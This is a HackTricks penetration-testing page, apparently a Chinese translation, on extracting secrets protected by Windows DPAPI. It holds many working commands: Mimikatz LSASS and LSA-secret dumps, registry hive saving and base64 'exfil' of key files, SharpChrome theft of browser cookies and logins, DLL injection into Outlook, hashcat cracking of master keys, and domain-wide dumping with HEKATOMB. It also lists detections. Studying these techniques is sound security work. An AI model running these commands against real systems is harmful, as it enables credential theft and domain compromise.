# DPAPI - 提取密码

{{#include ../../banners/hacktricks-training.md}}



## 什么是 DPAPI

The Data Protection API (DPAPI) 主要用于 Windows 操作系统中对 **symmetric encryption of asymmetric private keys**，利用用户或系统机密作为主要熵源。该方法简化了开发者的加密工作，使他们可以使用从用户登录凭证派生的密钥进行加密，或在系统加密时使用系统的域认证机密，从而无需开发者自己管理加密密钥的保护。

使用 DPAPI 最常见的方式是通过 **`CryptProtectData` and `CryptUnprotectData`** 函数，这些函数允许应用在当前登录会话的上下文中安全地加密和解密数据。这意味着，被加密的数据只有由加密它的同一用户或系统才能解密。

此外，这些函数还接受一个 **`entropy` parameter**，该参数在加密和解密过程中也会被使用。因此，要解密使用该参数加密的内容，必须提供与加密时使用的相同 `entropy` 值。

### 用户密钥生成

DPAPI 基于用户凭证为每个用户生成一个唯一密钥（称为 **`pre-key``**）。该密钥由用户密码和其他因素派生，算法取决于用户类型，但最终是基于 SHA1。比如，对于域用户，**它取决于用户的 NTLM hash**。

这点特别有趣，因为如果攻击者能够获取到用户的密码哈希，他们可以：

- **使用该用户的密钥无需调用任何 API 即可解密任何使用 DPAPI 加密的数据**
- 尝试离线 **破解密码**，以生成有效的 DPAPI 密钥

此外，每次用户使用 DPAPI 加密数据时，都会生成一个新的 **master key**。该 master key 是实际用于加密数据的密钥。每个 master key 都有一个用于标识它的 **GUID**（全局唯一标识符）。

master keys 存储在 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 目录中，其中 `{SID}` 是该用户的 Security Identifier。master key 被用户的 **`pre-key`** 加密存储，同时也被一个用于恢复的 **domain backup key** 加密（因此同一密钥被以两种不同方式加密存储两次）。

请注意，**用于加密 master key 的 domain key 存储在域控制器中且不会改变**，因此如果攻击者能够访问域控制器，他们可以检索 domain backup key 并解密域内所有用户的 master key。

加密的 blob 在其头部包含用于加密数据的 **master key 的 GUID**。

> [!TIP]
> DPAPI 加密的 blobs 以 **`01 00 00 00`** 开头

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### 机器/系统 密钥生成

这是机器用于加密数据的密钥。它基于 **DPAPI_SYSTEM LSA secret**，这是一个只有 SYSTEM 用户可以访问的特殊密钥。该密钥用于加密需要由系统本身访问的数据，例如机器级凭据或系统范围的秘密。

注意这些密钥 **没有域备份**，因此它们只能在本地访问：

- **Mimikatz** 可以通过导出 LSA secrets 并使用命令：`mimikatz lsadump::secrets` 访问它
- The secret is stored inside the registry, so an administrator could **modify the DACL permissions to access it**. The registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Offline extraction from registry hives is also possible. For example, as an administrator on the target, save the hives and exfiltrate them:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
然后在你的分析主机上，从 hives 中恢复 DPAPI_SYSTEM LSA secret，并使用它解密 machine-scope blobs（例如计划任务密码、服务凭据、Wi‑Fi 配置文件等）：
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### 由 DPAPI 保护的数据

受 DPAPI 保护的个人数据包括：

- Windows 凭据
- Internet Explorer 和 Google Chrome 的密码和自动填充数据
- Outlook 和 Windows Mail 等应用的电子邮件和内部 FTP 帐户密码
- 共享文件夹、资源、无线网络和 Windows Vault 的密码，包括加密密钥
- 远程桌面连接、.NET Passport 的密码，以及用于各种加密和认证用途的私钥
- 由 Credential Manager 管理的网络密码，以及使用 CryptProtectData 的应用中的个人数据，例如 Skype、MSN messenger 等
- 注册表中的加密 blob
- ...

系统受保护的数据包括：
- Wifi 密码
- 计划任务密码
- ...

### 主密钥提取选项

- 如果用户具有域管理员权限，他们可以访问 **域备份密钥** 来解密域内所有用户的主密钥：
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- 拥有本地管理员权限时，可以 **访问 LSASS 内存** 以提取所有已连接用户的 DPAPI 主密钥和 SYSTEM 密钥。
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- 如果用户具有本地管理员权限，他们可以访问 **DPAPI_SYSTEM LSA secret** 来解密计算机主密钥：
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- 如果已知该用户的 password 或 NTLM hash，你可以 **直接解密该用户的主密钥**：
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- 如果你以该用户的会话身份登录，可以向 DC 请求 **backup key to decrypt the master keys using RPC**。如果你是 local admin 且该用户已登录，你可以为此 **steal his session token**：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## 列出 Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## 访问 DPAPI 加密数据

### 查找 DPAPI 加密数据

常见用户的**受保护文件**位于：

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 还可以将上述路径中的 `\Roaming\` 更改为 `\Local\` 进行检查。

枚举示例：
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) 可以在文件系统、注册表和 B64 blobs 中找到 DPAPI 加密的数据块：
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Note that [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (from the same repo) can be used to decrypt using DPAPI sensitive data like cookies.

#### Chromium/Edge/Electron 快速用法 (SharpChrome)

- 当前用户，交互式解密已保存的登录凭据/cookies（即使对 Chrome 127+ 的 app-bound cookies 也有效，因为在以用户上下文运行时，额外的密钥会从用户的 Credential Manager 中解析出来）：
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- 离线分析（当你只有文件时）。首先从配置文件的 "Local State" 中提取 AES state key，然后使用它来 decrypt cookie DB：
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- 域范围/远程 排查：当你拥有 DPAPI domain backup key (PVK) 并在目标主机上具有 admin 时：
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- 如果你拥有用户的 DPAPI prekey/credkey（来自 LSASS），你可以跳过密码破解并直接解密配置文件数据：
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
注意
- 较新的 Chrome/Edge 构建版本可能使用 "App-Bound" 加密来存储某些 cookies。没有额外的 app-bound key，无法离线解密这些特定的 cookies；在目标用户上下文下运行 SharpChrome 可自动检索该 app-bound key。参见下方引用的 Chrome 安全博客文章。

### 访问密钥和数据

- **Use SharpDPAPI** 从当前会话的 DPAPI 加密文件中获取凭证：
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **获取凭据信息**，例如加密数据和 guidMasterKey。
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

使用 RPC 解密请求 **domain backup key** 的用户的 masterkey：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
该 **SharpDPAPI** 工具还支持用于 masterkey 解密的这些参数（注意可以使用 `/rpc` 获取域的备份密钥、使用 `/password` 提供明文密码，或使用 `/pvk` 指定 DPAPI 域私钥文件...）：
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **使用 masterkey 解密数据**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** 工具还支持这些用于 `credentials|vaults|rdg|keepass|triage|blob|ps` 解密的参数（注意可以使用 `/rpc` 获取域备份密钥，使用 `/password` 提供明文密码，使用 `/pvk` 指定 DPAPI 域私钥文件，使用 `/unprotect` 使用当前用户会话...）：
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- 使用 DPAPI prekey/credkey 直接（不需要密码）

如果你能转储 LSASS，Mimikatz 通常会暴露一个每次登录的 DPAPI key，可用于在不知晓明文密码的情况下解密用户的 masterkeys。将此值直接传递给工具：
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- 使用 **当前用户会话** 解密一些数据：
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
### 使用 Impacket dpapi.py 离线解密

如果你拥有受害用户的 SID 和 password（或 NT hash），可以使用 Impacket’s dpapi.py 在完全离线的情况下解密 DPAPI masterkeys 和 Credential Manager blobs。

- 在磁盘上识别工件:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- 如果文件传输工具不稳定，请在主机上对文件进行 base64 编码并复制输出:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- 使用用户的 SID 和 password/hash 解密 masterkey:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- 使用解密的 masterkey 来解密 credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
该工作流通常可以恢复由使用 Windows Credential Manager 的应用保存的域凭据，包括管理账户（例如 `*_adm`）。

---

### 处理可选熵（"第三方熵"）

一些应用会向 `CryptProtectData` 传入一个额外的 **熵** 值。没有这个值，即使已知正确的 masterkey，blob 也无法被解密。因此，在针对以这种方式保护的凭据（例如 Microsoft Outlook、某些 VPN 客户端）时，获取该熵是至关重要的。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) 是一个用户模式 DLL，它在目标进程内部 hook DPAPI 函数，并透明地记录任何提供的可选熵。以 **DLL-injection** 模式对 `outlook.exe` 或 `vpnclient.exe` 等进程运行 EntropyCapture 将输出一个文件，将每个熵缓冲区映射到调用进程和 blob。捕获到的熵随后可以提供给 **SharpDPAPI** (`/entropy:`) 或 **Mimikatz** (`/entropy:<file>`) 以解密数据。
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### 离线破解主密钥 (Hashcat & DPAPISnoop)

Microsoft 在 Windows 10 v1607 (2016) 开始引入了 **context 3** 主密钥格式。`hashcat` v6.2.6 (December 2023) 增加了哈希模式 **22100** (DPAPI masterkey v1 context ), **22101** (context 1) 和 **22102** (context 3)，允许使用 GPU 加速直接从主密钥文件破解用户密码。因此，攻击者可以执行字典或暴力破解攻击，而无需与目标系统交互。

`DPAPISnoop` (2024) 自动化了该过程：
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
该工具还可以解析 Credential 和 Vault blobs，使用已破解的密钥对其解密并导出明文密码。

### 访问其他机器的数据

在 **SharpDPAPI 和 SharpChrome** 中，你可以指定 **`/server:HOST`** 选项来访问远程机器的数据。当然你需要能够访问该机器，以下示例假定已知 **域备份加密密钥**：
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## 其他工具

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) 是一个自动化工具，用于从 LDAP 目录提取所有用户和计算机，并通过 RPC 提取域控制器备份密钥。脚本随后会解析所有计算机的 IP 地址，并对所有计算机执行 smbclient 以检索所有用户的 DPAPI blobs，并使用域备份密钥解密所有内容。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

通过从 LDAP 提取的计算机列表，即使你之前不知道，也可以发现每个子网！

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) 可以自动转储受 DPAPI 保护的秘密。2.x 版本引入了：

* 并行从数百台主机收集 blobs
* 解析 **context 3** masterkeys 并与 Hashcat 自动集成进行破解
* 支持 Chrome “App-Bound” 加密 cookie（见下一节）
* 新增 **`--snapshot`** 模式，用于反复轮询端点并比较新创建的 blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) 是一个 C# 解析器，用于解析 masterkey/credential/vault 文件，可输出 Hashcat/JtR 格式并可选地自动调用破解。它完全支持直到 Windows 11 24H1 的机器和用户 masterkey 格式。

## 常见检测

- 访问 `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 和其他与 DPAPI 相关的目录。
- 尤其是通过网络共享，如 **C$** 或 **ADMIN$**。
- 使用 **Mimikatz**、**SharpDPAPI** 或类似工具访问 LSASS 内存或转储 masterkeys。
- 事件 **4662**：*An operation was performed on an object* —— 可与对 **`BCKUPKEY`** 对象的访问相关联。
- 事件 **4673/4674**：当进程请求 *SeTrustedCredManAccessPrivilege*（Credential Manager）时。

---
### 2023-2025 漏洞与生态系统变化

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing**（2023 年 11 月）。具有网络访问的攻击者可能诱使域成员检索恶意 DPAPI 备份密钥，从而解密用户 masterkeys。已在 2023 年 11 月的累积更新中修补——管理员应确保域控制器 (DCs) 和工作站已完全打补丁。
* **Chrome 127 “App-Bound” cookie encryption**（2024 年 7 月）用存储在用户 **Credential Manager** 下的额外密钥替换了仅依赖 DPAPI 的旧保护。离线解密 cookie 现在需要 DPAPI masterkey 和 **GCM-wrapped app-bound key**。SharpChrome v2.3 和 DonPAPI 2.x 在以用户上下文运行时能够恢复该额外密钥。

### 案例研究：Zscaler Client Connector – 从 SID 推导的自定义熵

Zscaler Client Connector 在 `C:\ProgramData\Zscaler` 下存储多个配置文件（例如 `config.dat`、`users.dat`、`*.ztc`、`*.mtt`、`*.mtc`、`*.mtp`）。每个文件都使用 **DPAPI (Machine scope)** 加密，但厂商提供了在运行时计算的 **自定义熵**，而不是将其存储在磁盘上。

该熵由两个元素重建：

1. 嵌入在 `ZSACredentialProvider.dll` 中的硬编码密钥。
2. 配置所属的 Windows 帐户的 **SID**。

DLL 实现的算法等效于：
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
因为该秘密嵌入在一个可以从磁盘读取的 DLL 中，**任何具有 SYSTEM 权限的本地攻击者都可以为任何 SID 重新生成 entropy** 并离线解密这些 blobs：
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
解密会产生完整的 JSON 配置，包括每个 **设备姿态检查** 及其预期值——这些信息在尝试客户端绕过时非常有价值。

> 提示：其他加密的工件 (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) 使用 DPAPI 保护且 **不含** 熵（`16` 个零字节）。因此，一旦获得 SYSTEM 权限，就可以直接使用 `ProtectedData.Unprotect` 解密。

## 参考资料

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
